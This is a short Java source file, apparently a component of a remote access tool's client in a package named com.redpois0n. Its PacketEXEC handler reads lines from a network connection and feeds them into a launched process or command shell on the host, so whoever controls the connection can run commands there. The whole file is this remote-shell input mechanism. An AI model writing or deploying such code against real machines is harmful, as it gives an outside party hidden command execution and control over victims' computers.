package com.redpois0n.packets.in;

import java.io.PrintWriter;

import com.redpois0n.CMD;
import com.redpois0n.Connection;
import com.redpois0n.LaunchProcess;


public class PacketEXEC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();
		
		if (LaunchProcess.latest != null) {
			PrintWriter input = new PrintWriter(LaunchProcess.latest.p.getOutputStream(), true);
			input.println(line);
		} else if (CMD.p != null) {
			PrintWriter input = new PrintWriter(CMD.p.getOutputStream(), true);
			input.println(line);
		}
	}

}
